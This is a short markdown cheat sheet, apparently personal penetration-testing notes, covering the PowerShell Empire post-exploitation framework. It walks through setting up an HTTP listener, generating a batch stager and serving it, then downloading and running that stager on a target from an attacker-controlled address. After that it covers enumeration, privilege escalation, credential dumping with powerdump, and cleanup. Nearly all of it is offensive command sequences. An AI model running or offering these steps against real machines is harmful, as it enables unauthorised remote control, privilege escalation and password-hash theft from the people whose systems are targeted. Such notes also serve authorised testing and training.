# Powershell Empire

## Setup 
` cd /opt/empire/setup` 
` sudo ./reset.sh `
` sudo ../empire.sh`

### Search for stuff 
`searchmodule privesc`

### Listeners
` listeners`
` uselistener http`
` uselistener meterpreter`
` info`
` usestager <tab><tab>`

### HTTP Listener 
` set DefaultDelay 1`
` set Port 8080`
` set Host http://192.168.88.141:8080`
` usestager windows/launcher_bat`
` set Listener http`
` generate`
` cd /tmp`
` python -m http.server`

### On Target 
` wget http://192.168.88.141:8000/launcher.bat -outfile launcher.bat`
` ls launcher.bat`
` <run it> `

### Back to empire 
` agents`
` interact 39GA2N8S`
` rename hacked`
` info`

### Enumeration 
` usemodule situational_awareness/host/winenum`
` shell ipconfig`
` shell whoami`
` usemodule situational_awareness/network/portscan `
` set Hosts 10.10.10.10`
 
### Priv Esc
` serachmodule powerup`
` usemodule privesc/powerup/allchecks`
` usemodule privesc/ask`
` set Listener http`
` agents`
` interact new`

### Creds
` usemodule credentials/powerdump*`

### Destroy 
` agents`
` kill all`
` listeners`
` kill http` 